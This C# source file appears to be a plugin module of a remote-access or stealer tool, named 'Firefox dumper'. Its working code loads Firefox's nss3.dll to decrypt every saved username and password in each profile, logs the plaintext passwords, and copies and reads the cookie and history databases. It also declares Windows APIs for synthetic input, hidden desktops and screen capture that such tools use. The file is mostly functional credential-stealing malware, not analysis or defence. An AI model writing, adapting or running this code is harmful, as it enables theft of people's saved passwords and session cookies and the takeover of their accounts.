using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Plugin.Abstractions48;
using Org.BouncyCastle.Asn1;
using System.Security.Cryptography;
using System.Data;
using System.Net;

namespace Plugin48Dumper
{
    public class clsFirefoxDumper : clsDumper
    {
        public string BrowserName { get { return "Firefox"; } }
        public DataTable dtHelp = new DataTable();

        private string m_szFirefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\");

        public clsFirefoxDumper()
        {
            Entry = "firefox";
            Description = "Firefox dumper";
            Usage = "firefox <action>";

            dtHelp.Columns.Add("Action");
            dtHelp.Columns.Add("Description");

            dtHelp.Rows.Add("cred", "Dump credentials.");
            dtHelp.Rows.Add("history", "Dump browser history records.");
            dtHelp.Rows.Add("cookie", "Dump browser cookies.");

            Available = Directory.Exists(m_szFirefoxPath);
        }

        public override void fnRun(List<string> lsArgs)
        {

        }

        public List<clsCredential> fnDumpCredential(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();

            try
            {
                List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
                if (lsDir.Count == 0)
                    return ls;

                foreach (string szDir in lsDir)
                {
                    clsTools.fnLogInfo("Checking directory: " + szDir);

                    string szDbFilePath = Path.Combine(szDir, "logins.db");
                    string szJsonFilePath = Path.Combine(szDir, "logins.json");
                    if (string.IsNullOrEmpty(szDir) || !File.Exists(szDbFilePath) || !File.Exists(szJsonFilePath))
                        continue;

                    clsTools.fnLogInfo("Profile directory: " + szDir);
                    clsTools.fnLogInfo("SQLite file: " + szDbFilePath);
                    clsTools.fnLogInfo("JSON file: " + szJsonFilePath);

                    using (var decryptor = new FFDecryptor())
                    {
                        try 
                        {
                            var r = decryptor.Init(szDir);
                            if (r == 0)
                                clsTools.fnLogOK("NSS_Init: " + r.ToString("X"));
                            else
                                clsTools.fnLogError("NSS_Init: " + r.ToString("X"));
                        } 
                        catch (Exception ex)
                        {
                            clsTools.fnLogError(ex.Message);
                        }

                        FFLogins logins = JsonConvert.DeserializeObject<FFLogins>(File.ReadAllText(szJsonFilePath));

                        foreach (Login login in logins.Logins)
                        {
                            try
                            {
                                string szUsername = "N/A";
                                string szPassword = "N/A";

                                try 
                                { 
                                    szUsername = decryptor.Decrypt(login.EncryptedUsername); 
                                } 
                                catch (Exception ex)
                                {
                                    clsTools.fnLogError("Decrypt username failed: " + ex.Message);
                                    clsTools.fnLogError("Username cipher: " + login.EncryptedUsername);
                                }

                                try 
                                { 
                                    szPassword = decryptor.Decrypt(login.EncryptedPassword);
                                } 
                                catch (Exception ex)
                                {
                                    clsTools.fnLogError("Decrypt password failed: " + ex.Message);
                                    clsTools.fnLogError("Password cipher: " + login.EncryptedPassword);
                                }

                                clsTools.fnLogInfo(szPassword);

                                ls.Add(new clsCredential
                                {
                                    Url = login.Hostname.ToString(),
                                    Username = szUsername,
                                    Password = szPassword,
                                    Create_Date = fnChromeTimeToDateTime(login.TimeCreated)?.ToString("F"),
                                    Last_Used_Date = fnChromeTimeToDateTime(login.TimeLastUsed)?.ToString("F"),
                                });
                            }
                            catch (Exception ex)
                            {
                                clsTools.fnLogError($"{ex.GetType().Name}: {ex.Message}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                clsTools.fnLogError($"{ex.GetType().Name}: {ex.Message}");
            }

            return ls;
        }


        public List<clsCookie> fnDumpCookie(int nCount, string szRegex)
        {
            List<clsCookie> ls = new List<clsCookie>();
            List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
            if (lsDir.Count == 0)
                return ls;

            foreach (string szDir in lsDir)
            {
                string szFilePath = Path.Combine(szDir, "cookies.sqlite");
                if (!File.Exists(szFilePath))
                    continue;

                string szTempPath = fnNewTempFilePath();
                File.Copy(szFilePath, szTempPath);

                var handler = new clsSQLiteHandler(szTempPath);
                if (!handler.ReadTable("moz_cookies"))
                    return ls;

                int nRowCount = handler.GetRowCount();
                clsTools.fnLogInfo($"Total records: {nRowCount}");

                for (int i = 0; i < nCount; i++)
                {
                    try
                    {
                        var host = handler.GetValue(i, "host");
                        var name = handler.GetValue(i, "name");
                        var value = handler.GetValue(i, "value");

                        var expDate = handler.GetValue(i, "expiry");
                        var lastDate = handler.GetValue(i, "lastAccessed");
                        var createDate = handler.GetValue(i, "creationTime");
                        var upDate = handler.GetValue(i, "updateTime");

                        ls.Add(new clsCookie
                        {
                            szHost = host,
                            szName = name,
                            szValue = value,

                            szExpiry = fnChromeTimeToDateTime(long.Parse(expDate))?.ToString("F"),
                            szCreation = fnChromeTimeToDateTime(long.Parse(createDate))?.ToString("F"),
                            szLastAccessed = fnChromeTimeToDateTime(long.Parse(lastDate))?.ToString("F"),
                            szUpdated = fnChromeTimeToDateTime(long.Parse(upDate))?.ToString("F"),
                        });
                    }
                    catch (Exception ex)
                    {
                        clsTools.fnLogError(ex.Message);
                    }
                }

                /*
                string szConnStr = fnConnString(szTempPath);
                using (var conn = new SQLiteConnection(szConnStr))
                {
                    conn.Open();

                    using (var cmd = new SQLiteCommand(conn))
                    {
                        string szQuery = $"SELECT " +
                           $"CAST(host AS TEXT) AS host, " +
                           $"CAST(name AS TEXT) as name, " +
                           $"CAST(value AS TEXT) as value, " +
                           $"expiry, lastAccessed, creationTime, updateTime " +
                           $"FROM moz_cookies ORDER BY lastAccessed DESC";

                        if (nCount != -1)
                            szQuery += $" LIMIT {nCount}";

                        cmd.CommandText = szQuery;

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                if (reader["host"] == DBNull.Value || reader["name"] == DBNull.Value || reader["value"] == DBNull.Value)
                                    continue;

                                string szHost = (string)reader["host"];
                                string szName = (string)reader["name"];
                                string szValue = (string)reader["value"];

                                long nExpiry = (long)reader["expiry"];
                                long nLastAccessed = (long)reader["lastAccessed"];
                                long nCreation = (long)reader["creationTime"];
                                long nUpdateTime = (long)reader["updateTime"];

                                ls.Add(new clsCookie()
                                {
                                    szHost = szHost,
                                    szName = szName,
                                    szValue = szValue,

                                    szExpiry = fnszChromeDateTime(nExpiry),
                                    szCreation = fnszChromeDateTime(nCreation),
                                    szLastAccessed = fnszChromeDateTime(nLastAccessed),
                                    szUpdated = fnszChromeDateTime(nUpdateTime),
                                });
                            }
                        }
                    }
                }

                */

                File.Delete(szTempPath);
            }

            return ls;
        }

        public List<clsHistory> fnDumpHistory(int nCount = 100, string szRegex = "")
        {
            List<clsHistory> ls = new List<clsHistory>();
            List<string> lsDir = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
            if (lsDir.Count == 0)
                return ls;

            foreach (string szDir in lsDir)
            {
                string szFilePath = Path.Combine(szDir, "places.sqlite");
                if (!File.Exists(szFilePath))
                    continue;

                string szTempPath = fnNewTempFilePath();
                File.Copy(szFilePath, szTempPath);

                var handler = new clsSQLiteHandler(szTempPath);
                if (!handler.ReadTable("moz_places"))
                    return ls;

                int nRowCount = handler.GetRowCount();
                clsTools.fnLogInfo($"Total records: {nRowCount}");

                for (int i = 0; i < nCount; i++)
                {
                    var url = handler.GetValue(i, "url");
                    var title = handler.GetValue(i, "title");
                    var date = handler.GetValue(i, "last_visit_date");

                    try
                    {
                        ls.Add(new clsHistory
                        {
                            szURL = url,
                            szTitle = title,
                            szLastUsed = fnChromeTimeToDateTime(long.Parse(date))?.ToString("F"),
                        });
                    }
                    catch (Exception ex)
                    {
                        clsTools.fnLogError(ex.Message);
                    }
                }

                /*
                string szConnStr = fnConnString(szTempPath);
                using (var conn = new SQLiteConnection(szConnStr))
                {
                    conn.Open();

                    using (var cmd = new SQLiteCommand(conn))
                    {
                        string szQuery = $"SELECT " +
                           $"CAST(url AS TEXT) AS url, " +
                           $"CAST(title AS TEXT) as title, " +
                           $"last_visit_date " +
                           $"FROM moz_places ORDER BY last_visit_date DESC";

                        if (nCount != -1)
                            szQuery += $" LIMIT {nCount}";

                        cmd.CommandText = szQuery;

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                if (reader["url"] == DBNull.Value || reader["title"] == DBNull.Value)
                                    continue;

                                string szUrl = (string)reader["url"];
                                string szTitle = (string)reader["title"];
                                long nLastVisitDate = (long)reader["last_visit_date"];

                                DateTime? dtLastUsed = fnChromeTimeToDateTime(nLastVisitDate);
                                string szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F");

                                if (Regex.IsMatch(szUrl, szRegex) ||
                                    Regex.IsMatch(szTitle, szRegex) ||
                                    Regex.IsMatch(szLastUsed, szRegex)
                                )
                                {
                                    ls.Add(new clsHistory()
                                    {
                                        szTitle = szTitle,
                                        szURL = szUrl,
                                        szLastUsed = szLastUsed,
                                    });
                                }
                            }
                        }
                    }
                }

                */

                File.Delete(szTempPath);
            }

            return ls;
        }

        public class clsHistory
        {
            public string szURL { get; set; }
            public string szTitle { get; set; }
            public string szLastUsed { get; set; }
        }
        public class clsDbPlace
        {
            public long id { get; set; }
            public string url { get; set; }
            public string title { get; set; }
            public long last_visit_date { get; set; }
            public string description { get; set; }
        }

        public class clsCookie
        {
            public string szHost { get; set; }
            public string szName { get; set; }
            public string szValue { get; set; }

            public string szCreation { get; set; }
            public string szExpiry { get; set; }
            public string szLastAccessed { get; set; }
            public string szUpdated { get; set; }
        }

        public class clsCredential
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Create_Date { get; set; }
            public string Last_Used_Date { get; set; }
            public string Pass_Time_Chage { get; set; }
            public string Pass_Times_Used { get; set; }
        }

        private class FFLogins
        {
            public long NextId { get; set; }
            public Login[] Logins { get; set; }
            public object[] PotentiallyVulnerablePasswords { get; set; }
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
            public long Version { get; set; }
        }

        private class DismissedBreachAlertsByLoginGuid
        {
        }

        private class Login
        {
            public long Id { get; set; }
            public Uri Hostname { get; set; }
            public object HttpRealm { get; set; }
            public Uri FormSubmitUrl { get; set; }
            public string UsernameField { get; set; }
            public string PasswordField { get; set; }
            public string EncryptedUsername { get; set; }
            public string EncryptedPassword { get; set; }
            public string Guid { get; set; }
            public long EncType { get; set; }
            public long TimeCreated { get; set; }
            public long TimeLastUsed { get; set; }
            public long TimePasswordChanged { get; set; }
            public long TimesUsed { get; set; }
        }

        /// <summary>
        /// Provides methods to decrypt Firefox credentials.
        /// </summary>
        public class FFDecryptor : IDisposable
        {
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate long NssInit(string configDirectory);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate long NssShutdown();

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

            private NssInit NSS_Init;

            private NssShutdown NSS_Shutdown;

            private Pk11sdrDecrypt PK11SDR_Decrypt;

            private IntPtr NSS3 = IntPtr.Zero;
            private IntPtr Mozglue = IntPtr.Zero;

            public long Init(string configDirectory)
            {
                string szProgramFile = Environment.GetEnvironmentVariable("ProgramW6432") ?? Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string mozillaPath = Path.Combine(szProgramFile, @"Mozilla Firefox\");
                if (!Directory.Exists(mozillaPath))
                {
                    clsTools.fnLogWarning("Directory not found: " + mozillaPath);

                    mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
                    
                    clsTools.fnLogInfo("Try to get new directory: " + mozillaPath);
                }

                if (Directory.Exists(mozillaPath))
                    clsTools.fnLogInfo("Directory exists: " + mozillaPath);
                else
                    throw new Exception("Directory not found: " + mozillaPath);
                
                Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
                if (IntPtr.Zero == Mozglue)
                    throw new Exception("Load mozglue.dll failed.");

                clsTools.fnLogInfo("mozlue.dll: " + Mozglue.ToString("X"));

                NSS3 = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));
                if (IntPtr.Zero == NSS3)
                    throw new Exception("Load nss3.dll failed.");

                clsTools.fnLogInfo("nss3.dll: " + NSS3.ToString("X"));

                IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
                if (IntPtr.Zero == initProc)
                    throw new Exception("Load NSS_Init failed.");

                clsTools.fnLogInfo("NSS_Init: " + initProc.ToString("X"));

                IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
                if (IntPtr.Zero == shutdownProc)
                    throw new Exception("Load NSS_Shutdown failed.");

                clsTools.fnLogInfo("NSS_Shutdown: " + shutdownProc.ToString("X"));
                
                IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
                if (IntPtr.Zero == decryptProc)
                    throw new Exception("PK11SDR_Decrypt");

                clsTools.fnLogInfo("PK11SDR_Decrypt: " + decryptProc.ToString("X"));

                NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
                PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
                NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
                
                
                return NSS_Init(configDirectory);
            }

            public string Decrypt(string cypherText)
            {
                IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
                StringBuilder sb = new StringBuilder(cypherText);

                try
                {
                    byte[] ffData = Convert.FromBase64String(cypherText);

                    ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                    Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                    TSECItem tSecDec = new TSECItem();
                    TSECItem item = new TSECItem();
                    item.SECItemType = 0;
                    item.SECItemData = ffDataUnmanagedPointer;
                    item.SECItemLen = ffData.Length;

                    if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                    {
                        if (tSecDec.SECItemLen != 0)
                        {
                            byte[] bvRet = new byte[tSecDec.SECItemLen];
                            Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                            return Encoding.ASCII.GetString(bvRet);
                        }
                    }
                }
                catch (Exception)
                {
                    return null;
                }
                finally
                {
                    if (ffDataUnmanagedPointer != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(ffDataUnmanagedPointer);
                    }
                }

                return null;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct TSECItem
            {
                public int SECItemType;
                public IntPtr SECItemData;
                public int SECItemLen;
            }

            /// <summary>
            /// Disposes all managed and unmanaged resources associated with this class.
            /// </summary>
            public void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this);
            }

            protected virtual void Dispose(bool disposing)
            {
                if (disposing)
                {
                    NSS_Shutdown();
                    NativeMethods.FreeLibrary(NSS3);
                    NativeMethods.FreeLibrary(Mozglue);
                }
            }
        }

        public static class NativeMethods
        {
            [StructLayout(LayoutKind.Sequential)]
            internal struct LASTINPUTINFO
            {
                public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
                [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;
                [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            internal static extern IntPtr LoadLibrary(string lpFileName);

            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool FreeLibrary(IntPtr hModule);

            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
            internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll", SetLastError = true)]
            internal static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In, Out] ref uint lpdwSize);

            /// <summary>
            ///    Performs a bit-block transfer of the color data corresponding to a
            ///    rectangle of pixels from the specified source device context into
            ///    a destination device context.
            /// </summary>
            /// <param name="hdc">Handle to the destination device context.</param>
            /// <param name="nXDest">The leftmost x-coordinate of the destination rectangle (in pixels).</param>
            /// <param name="nYDest">The topmost y-coordinate of the destination rectangle (in pixels).</param>
            /// <param name="nWidth">The width of the source and destination rectangles (in pixels).</param>
            /// <param name="nHeight">The height of the source and the destination rectangles (in pixels).</param>
            /// <param name="hdcSrc">Handle to the source device context.</param>
            /// <param name="nXSrc">The leftmost x-coordinate of the source rectangle (in pixels).</param>
            /// <param name="nYSrc">The topmost y-coordinate of the source rectangle (in pixels).</param>
            /// <param name="dwRop">A raster-operation code.</param>
            /// <returns>
            ///    <c>true</c> if the operation succeedes, <c>false</c> otherwise. To get extended error information, call <see cref="System.Runtime.InteropServices.Marshal.GetLastWin32Error"/>.
            /// </returns>
            [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
                [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

            [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
            internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

            [DllImport("gdi32.dll")]
            internal static extern bool DeleteDC([In] IntPtr hdc);

            [DllImport("user32.dll")]
            internal static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

            [DllImport("user32.dll")]
            internal static extern bool SetCursorPos(int x, int y);

            [DllImport("user32.dll", SetLastError = false)]
            internal static extern IntPtr GetMessageExtraInfo();

            /// <summary>
            /// Synthesizes keystrokes, mouse motions, and button clicks.
            /// </summary>
            [DllImport("user32.dll")]
            internal static extern uint SendInput(uint nInputs,
                [MarshalAs(UnmanagedType.LPArray), In] INPUT[] pInputs,
                int cbSize);

            [StructLayout(LayoutKind.Sequential)]
            internal struct INPUT
            {
                internal uint type;
                internal InputUnion u;
                internal static int Size => Marshal.SizeOf(typeof(INPUT));
            }

            [StructLayout(LayoutKind.Explicit)]
            internal struct InputUnion
            {
                [FieldOffset(0)]
                internal MOUSEINPUT mi;
                [FieldOffset(0)]
                internal KEYBDINPUT ki;
                [FieldOffset(0)]
                internal HARDWAREINPUT hi;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct MOUSEINPUT
            {
                internal int dx;
                internal int dy;
                internal int mouseData;
                internal uint dwFlags;
                internal uint time;
                internal IntPtr dwExtraInfo;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct KEYBDINPUT
            {
                internal ushort wVk;
                internal ushort wScan;
                internal uint dwFlags;
                internal uint time;
                internal IntPtr dwExtraInfo;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct HARDWAREINPUT
            {
                public uint uMsg;
                public ushort wParamL;
                public ushort wParamH;
            }

            [DllImport("user32.dll")]
            internal static extern bool SystemParametersInfo(
                uint uAction, uint uParam, ref IntPtr lpvParam,
                uint flags);

            [DllImport("user32.dll")]
            internal static extern int PostMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll", CharSet = CharSet.Unicode)]
            internal static extern IntPtr OpenDesktop(
                string hDesktop, int flags, bool inherit,
                uint desiredAccess);

            [DllImport("user32.dll")]
            internal static extern bool CloseDesktop(
                IntPtr hDesktop);

            internal delegate bool EnumDesktopWindowsProc(
                IntPtr hDesktop, IntPtr lParam);

            [DllImport("user32.dll")]
            internal static extern bool EnumDesktopWindows(
                IntPtr hDesktop, EnumDesktopWindowsProc callback,
                IntPtr lParam);

            [DllImport("user32.dll")]
            internal static extern bool IsWindowVisible(
                IntPtr hWnd);

            [DllImport("user32.dll")]
            internal static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

            [DllImport("iphlpapi.dll", SetLastError = true)]
            internal static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion,
                TcpTableClass tblClass, uint reserved = 0);

            [DllImport("iphlpapi.dll")]
            internal static extern int SetTcpEntry(IntPtr pTcprow);

            [StructLayout(LayoutKind.Sequential)]
            internal struct MibTcprowOwnerPid
            {
                public uint state;
                public uint localAddr;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] localPort;
                public uint remoteAddr;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] remotePort;
                public uint owningPid;
                public IPAddress LocalAddress
                {
                    get { return new IPAddress(localAddr); }
                }

                public ushort LocalPort
                {
                    get { return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0); }
                }

                public IPAddress RemoteAddress
                {
                    get { return new IPAddress(remoteAddr); }
                }

                public ushort RemotePort
                {
                    get { return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0); }
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct MibTcptableOwnerPid
            {
                public uint dwNumEntries;
                private readonly MibTcprowOwnerPid table;
            }

            internal enum TcpTableClass
            {
                TcpTableBasicListener,
                TcpTableBasicConnections,
                TcpTableBasicAll,
                TcpTableOwnerPidListener,
                TcpTableOwnerPidConnections,
                TcpTableOwnerPidAll,
                TcpTableOwnerModuleListener,
                TcpTableOwnerModuleConnections,
                TcpTableOwnerModuleAll
            }
        }
    }
}
